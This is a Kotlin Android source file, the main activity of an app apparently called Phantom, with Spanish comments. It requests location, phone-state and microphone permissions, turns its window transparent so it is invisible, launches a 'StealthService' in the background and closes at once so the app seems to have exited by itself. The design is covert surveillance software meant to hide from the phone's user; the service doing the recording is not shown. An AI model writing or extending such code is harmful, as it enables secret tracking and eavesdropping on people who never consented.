package com.phantom.os.activities

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.phantom.os.R
import com.phantom.os.services.StealthService

class MainActivity : AppCompatActivity() {

    companion object {
        const val TAG = "PhantomActivity"
        private val PERMISSIONS_REQUIRED = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECORD_AUDIO // Para micrófono
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Hacemos la ventana transparente para que sea invisible
        window.setBackgroundDrawableResource(android.R.color.transparent)
        
        Log.d(TAG, "👁️ Phantom Activity Inicializada")

        // Solicitar permisos si es necesario
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            checkAndRequestPermissions()
        } else {
            startStealthMode()
        }
    }

    private fun checkAndRequestPermissions() {
        val permissionsToRequest = PERMISSIONS_REQUIRED.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest, 101)
        } else {
            startStealthMode()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) {
            startStealthMode()
        }
    }

    private fun startStealthMode() {
        val intent = Intent(this, StealthService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        
        // Nos vamos rápidamente para que parezca que la app se cerró sola
        finish() 
    }
}
